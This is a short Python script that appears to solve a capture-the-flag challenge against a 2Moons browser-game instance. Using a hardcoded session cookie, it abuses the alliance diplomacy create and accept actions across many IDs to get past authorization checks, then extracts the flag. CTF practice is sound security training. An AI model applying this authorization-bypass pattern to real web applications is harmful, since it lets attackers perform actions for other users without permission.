import requests
import re

COOKIE = '8f74a59ee21abf9cbe7e2f38214fdb66'

def main():
    for i in range(0, 50):
        resp = requests.get(f'https://uni1.cursednova.securing.pl/game.php?page=alliance&mode=admin&action=diplomacyCreateProcessor&ajax=1&ally_id={i}&level=5&text=asd', cookies={'2Moons': COOKIE})
        print(i, resp.text)

    all = requests.get(f'https://uni1.cursednova.securing.pl/game.php?page=alliance&mode=admin&action=diplomacy', cookies={'2Moons': COOKIE}).text
    from bs4 import BeautifulSoup
    bs = BeautifulSoup(all, 'html.parser')
    links = []
    for link in bs.find_all('a'):
        links.append(link.get('href'))

    links = list(filter(lambda l: 'diplomacyDelete' in l, links))
    links = list(map(lambda l: int(l.split('diplomacyDelete&id=')[-1]), links))
    print(links)

    for i in links:
        resp = requests.get(f'https://uni1.cursednova.securing.pl/game.php?page=alliance&mode=admin&action=diplomacyAccept&id={i}', cookies={'2Moons': COOKIE})
        print(i)


    resp= requests.get('https://uni1.cursednova.securing.pl/game.php?page=alliance&mode=admin&action=diplomacy', cookies={'2Moons': COOKIE})
    match = re.search(r'CURSEDNOVA\{.*}', resp.text)
    print(match.group(0))


if __name__ == '__main__':
    main()
